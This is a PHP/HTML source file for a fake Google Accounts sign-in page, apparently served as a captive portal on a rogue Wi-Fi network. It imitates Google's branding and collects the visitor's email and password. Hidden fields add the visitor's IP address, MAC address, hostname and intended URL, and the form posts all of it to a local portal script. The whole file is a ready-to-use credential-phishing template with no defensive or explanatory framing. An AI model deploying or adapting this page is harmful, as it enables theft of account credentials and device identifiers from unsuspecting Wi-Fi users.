<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
        <meta http-equiv="Pragma" content="no-cache" />
        <meta http-equiv="Expires" content="0" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

        <title>Sign in - Google Accounts</title>

        <script src='assets/js/jquery-3.4.1.min.js'></script>
        <script src='assets/js/jquery-ui.min.js'></script>
        <script src='assets/js/bootstrap.min.js'></script>
        <link href='assets/css/bootstrap.min.css' rel="stylesheet">
        <link href='assets/css/progress-bar.css' rel="stylesheet">
        <link rel="stylesheet" href="assets/css/custom.css">
        <link rel="icon" type="image/png" href="assets/images/favicon.ico">

        <style media="screen">
            @font-face {
              font-family: 'Roboto';
              src: url('assets/fonts/Roboto-Regular.ttf') format('truetype');
              font-weight: normal;
            }

            @font-face {
              font-family: 'open-sans';
              src: url('assets/fonts/OpenSans-Regular.ttf') format('truetype');
              font-weight: normal;
            }
        </style>
    </head>
    <body>
        <div id='login-app'>
            <div class="login-container">
                <div class='progress-bar-container show-progress'>
                    <div class="progress-bar mdc-linear-progress mdc-linear-progress--indeterminate progress-hidden" style='display:none;'>
                        <div class="mdc-linear-progress mdc-linear-progress--indeterminate">
                            <div class="mdc-linear-progress__buffering-dots"></div>
                            <div class="mdc-linear-progress__buffer"></div>
                            <div class="mdc-linear-progress__bar mdc-linear-progress__primary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                            <div class="mdc-linear-progress__bar mdc-linear-progress__secondary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                        </div>
                    </div>
                </div>

                <div class='login-content' id='login-form'>
                    <div id="logo" title="Google">
                        <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
                    </div>

                    <form method="POST" action="/captiveportal/index.php" id='email-form-step'>
                        <h1 class='g-h1'>Sign in</h1>
                        <h2 class='g-h2'>Use your Google Account</h2>
                        <div class='login-content'>
                            <div class="floating-input">
                                <input name="email" id='email-input' type="text" class='g-input' placeholder=" " value="" required>
                                <label for="email-input" class="floating-label">Email or phone</label>
                            </div>

                            <div class="floating-input">
                                <input name="password" id='password-input' type="password" class='g-input password-input' placeholder=" " value="" required>
                                <label for="password-input" class="floating-label">Password</label>
                            </div>

                            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                            <input type="hidden" name="target" value="<?=$destination?>">

                            <a href="#" class="forgot-email">Forgot email?</a>
                            <div class='login-priv'>
                                <p class='p'>Not your computer? Use a Private Window to sign in. <a href="#">Learn more about using Guest mode</a></p>
                            </div>

                            <div class='login-nav'>
                                <a href="#" class="create-account">Create Account</a>
                                <button class='gbtn-primary' type="submit">Next</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </body>
</html>
